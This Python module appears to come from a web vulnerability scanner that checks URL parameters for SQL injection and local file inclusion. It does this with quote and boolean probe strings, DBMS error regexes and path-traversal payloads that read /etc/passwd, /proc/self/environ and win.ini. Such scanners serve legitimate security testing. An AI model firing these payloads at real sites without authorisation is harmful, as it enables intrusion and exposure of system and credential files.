# author: al0ne
# https://github.com/al0ne

import re
import concurrent.futures
from lib.Requests import Requests
from lib.url import dedup_url

links = []

DBMS_ERRORS = {  # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
        r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
        r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (
        r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
               r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


class Getoutofloop(Exception):
    pass


class SqlLfi():
    def __init__(self):
        self.result = []
        self.req = Requests()
    
    def sqli(self, qurl):
        payload = {
            "'", "%2527", "')", " AnD 7738=8291"
        }
        LFI_payload = {'../../../../etc/passwd|root:x', '../../../../etc/group|root:x', 'random.php|Failed opening',
                       'file://c:/windows/win.ini|drivers', '/proc/self/environ|USER='}
        try:
            for _ in payload:
                url = qurl + _
                r = self.req.get(url)
                for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
                    if re.search(regex, r.text):
                        result = '{} SQLi:{}'.format(dbms, qurl)
                        self.result.append(result)
                        raise Getoutofloop
            for i in LFI_payload:
                url = ''
                lfi, pattern = i.split('|')
                if re.search(r'=\w+\.\w{3}$', qurl):
                    url = re.sub(r'\w+\.\w{3}$', lfi, qurl)
                elif re.search('=\w+', qurl):
                    url = re.sub(r'\w+$', lfi, qurl)
                r = self.req.get(url)
                if re.search(pattern, r.text, re.S):
                    self.result.append('LFI: {}'.format(url))
                    break
        except:
            pass
    
    def pool(self, urls):
        host = dedup_url(urls)
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=30) as executor:
            executor.map(self.sqli, host)
        return self.result


if __name__ == "__main__":
    host = ['http://testphp.vulnweb.com/artists.php?artist=1']
    print(SqlLfi().pool(host))
